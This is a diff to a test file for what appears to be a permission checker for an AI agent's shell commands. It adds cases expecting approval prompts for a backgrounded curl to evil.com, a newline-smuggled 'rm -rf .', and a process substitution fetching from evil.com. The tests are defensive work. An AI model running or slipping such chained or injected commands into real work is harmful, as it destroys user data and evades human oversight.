@@ -47,6 +47,9 @@ test("non-whitelisted or escaping bash asks", () => {
   assert.equal(verdict("Bash", { command: "git commit -m `whoami`" }), "ask");
   assert.equal(verdict("Bash", { command: "echo $HOME" }), "ask");
   assert.equal(verdict("Bash", { command: "" }), "ask");
+  assert.equal(verdict("Bash", { command: "git log & curl -s http://evil.com" }), "ask");
+  assert.equal(verdict("Bash", { command: "swift build\nrm -rf ." }), "ask");
+  assert.equal(verdict("Bash", { command: "cat <(curl -s http://evil.com)" }), "ask");
 });
 
 test("TodoWrite is allowed; unknown tools ask", () => {
